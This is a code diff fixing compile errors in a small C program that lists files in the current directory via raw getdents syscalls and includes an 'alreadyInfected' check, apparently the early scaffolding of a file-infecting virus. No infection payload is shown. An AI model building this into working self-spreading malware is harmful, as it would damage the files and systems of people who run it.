@@ -1,9 +1,12 @@
 #include <stdio.h>
 #include <dirent.h>
 #include <sys/stat.h>
-#include <fnctl.h>
+#include <fcntl.h>
 #include <unistd.h>
 #include <sys/syscall.h>
+#include <string.h>
+
+#define BUFFERSIZE 2048
 
 int alreadyInfected(){
 
@@ -20,21 +23,21 @@ int findFilesinDirectory(){
         printf("[-] error obtaining file descriptor to current working directory\n");
         return -1;
     }
-
-    bytesRead = sys_getdents64(fd, directoryEntry, sizeof(struct linux_dirent));
+    
+    bytesRead = syscall(SYS_getdents, fd, directoryEntry, BUFFERSIZE);
 
     while (bytesRead > 0){
         if((strcmp(directoryEntry->d_name, ".") != 0) && (strcmp(directoryEntry->d_name, "..")) != 0 ){
             printf("File name: %s\n", directoryEntry->d_name);
         }
 
-        bytesRead = sys_getdents64(fd, directoryEntry, sizeof(struct linux_dirent));
+        bytesRead = syscall(SYS_getdents, fd, directoryEntry, BUFFERSIZE);
     }
 
     return 0;
 }
 
-int main(int argc char *argv[]){
+int main(int argc, char *argv[]){
 
     char buffer[5000]; // trying to reserve 5000 bytes of memory to write into
 
